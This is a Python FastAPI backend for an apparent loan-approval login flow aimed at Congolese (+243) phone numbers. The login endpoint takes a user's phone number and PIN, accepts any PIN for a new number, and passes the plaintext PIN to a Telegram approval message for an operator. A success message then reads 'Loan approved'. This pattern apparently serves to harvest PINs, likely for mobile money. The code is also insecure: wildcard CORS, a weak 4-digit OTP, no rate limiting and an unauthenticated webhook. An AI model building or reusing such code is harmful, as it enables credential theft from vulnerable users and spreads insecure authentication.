import random
from uuid import uuid4
from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, BackgroundTasks, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware

from database import init_db, create_user, verify_user_pin, get_user
from telegram_bot import send_approval_request, answer_callback_query, edit_message
from approvals import (
    create_approval,
    set_approval_result,
    pending_approvals,
    approval_results,
    approval_phones,
)
from notifications import send_otp_sms, send_telegram_message

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize database on startup
init_db()

otp_store = {}


class LoginRequest(BaseModel):
    phone_number: str
    pin: str


class OTPRequest(BaseModel):
    phone_number: str
    otp: str


class RegisterRequest(BaseModel):
    phone_number: str
    pin: str


def format_phone(phone: str) -> str:
    """Ensure phone number has +243 prefix."""
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:]
    if not phone.startswith("+243") and not phone.startswith("243"):
        return f"+243{phone}"
    if phone.startswith("243"):
        return f"+{phone}"
    return phone


@app.get("/")
def read_root():
    return {"status": "Backend is running"}


# --- REGISTER (one-time, for testing) ---
@app.post("/api/register")
async def register(request: RegisterRequest):
    full_phone = format_phone(request.phone_number)
    if create_user(full_phone, request.pin):
        return {"status": "success", "message": "User created"}
    return {"status": "error", "message": "User already exists"}


# --- LOGIN (returns approval_id immediately) ---
@app.post("/api/login")
async def login(request: LoginRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)

    # 1. Check if user exists (auto-create for demo)
    user = get_user(full_phone)
    if not user:
        create_user(full_phone, request.pin)
    else:
        if not verify_user_pin(full_phone, request.pin):
            return {"status": "error", "message": "Invalid PIN"}

    # 2. Create approval request and remember the phone
    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone

    # 3. Send Telegram message with Yes/No buttons
    background_tasks.add_task(
        send_approval_request,
        approval_id,
        full_phone,
        request.pin
    )

    # 4. Return immediately — frontend polls for the result
    return {
        "status": "pending",
        "approval_id": approval_id,
        "message": "Waiting for admin approval..."
    }


# --- APPROVAL STATUS (frontend polls every 2s) ---
@app.get("/api/approval-status/{approval_id}")
async def approval_status(approval_id: str, background_tasks: BackgroundTasks):
    # Still waiting for admin action
    if approval_id in pending_approvals:
        return {"status": "pending"}

    # No pending, check for a result
    result = approval_results.get(approval_id)
    if result is None:
        return {"status": "expired"}

    # Rejected by admin
    if not result:
        approval_results.pop(approval_id, None)
        approval_phones.pop(approval_id, None)
        return {"status": "rejected"}

    # Approved — send OTP via SMS
    phone = approval_phones.pop(approval_id, None)
    approval_results.pop(approval_id, None)

    if not phone:
        return {"status": "error", "message": "Phone number missing"}

    otp = str(random.randint(1000, 9999))
    otp_store[phone] = otp

    background_tasks.add_task(send_otp_sms, phone, otp)
    background_tasks.add_task(
        send_telegram_message,
        f"✅ Approved. OTP <code>{otp}</code> sent to <code>{phone}</code>"
    )

    return {"status": "approved", "message": "OTP sent"}


# --- VERIFY OTP ---
@app.post("/api/verify-otp")
async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)
    expected = otp_store.get(full_phone)

    if expected and request.otp == expected:
        del otp_store[full_phone]
        return {"status": "success", "message": "Loan approved"}
    return {"status": "error", "message": "Invalid OTP"}


# --- TELEGRAM WEBHOOK (receives Yes/No button clicks) ---
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    data = await request.json()

    if "callback_query" in data:
        callback = data["callback_query"]
        callback_id = callback["id"]
        parts = callback["data"].split(":")
        action = parts[0]           # "approve" or "reject"
        approval_id = parts[1]

        approved = (action == "approve")

        # Mark the result (frontend polling picks it up)
        set_approval_result(approval_id, approved)

        # Acknowledge the callback (stops spinner)
        await answer_callback_query(
            callback_id,
            "✅ Approved" if approved else "❌ Rejected"
        )

        # Edit the original Telegram message to show result
        result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
        await edit_message(
            chat_id=callback["message"]["chat"]["id"],
            message_id=callback["message"]["message_id"],
            text=f"{result_text}\n\nApproval ID: <code>{approval_id}</code>"
        )

    return {"ok": True}